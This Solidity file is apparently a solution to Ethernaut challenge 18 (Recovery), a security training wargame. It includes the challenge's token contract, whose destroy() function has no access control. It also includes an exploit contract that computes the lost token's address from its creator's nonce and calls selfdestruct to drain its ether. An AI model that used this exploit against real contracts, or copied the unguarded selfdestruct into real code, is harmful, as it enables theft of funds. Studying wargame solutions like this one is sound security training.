// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Solution for https://ethernaut.openzeppelin.com/ challenge 18 (Recovery)

contract Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

contract RecoveryExploit {
    function calculateAddress(address _creator, uint256 _nonce) public pure returns (address) {
        bytes memory data;
        if (_nonce == 0x00) {
            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _creator, bytes1(0x80));
        } else if (_nonce <= 0x7f) {
            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _creator, uint8(_nonce));
        } else if (_nonce <= 0xff) {
            data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), _creator, bytes1(0x81), uint8(_nonce));
        } else if (_nonce <= 0xffff) {
            data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), _creator, bytes1(0x82), uint16(_nonce));
        } else if (_nonce <= 0xffffff) {
            data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), _creator, bytes1(0x83), uint24(_nonce));
        } else {
            data = abi.encodePacked(bytes1(0xda), bytes1(0x94), _creator, bytes1(0x84), uint32(_nonce));
        }
        return address(uint160(uint256(keccak256(data))));
    }

    function recover(address _recoveryContract) public returns (address) {
        address lostToken = calculateAddress(_recoveryContract, 1);
        SimpleToken token = SimpleToken(payable(lostToken));
        token.destroy(payable(msg.sender));
        return lostToken;
    }
}

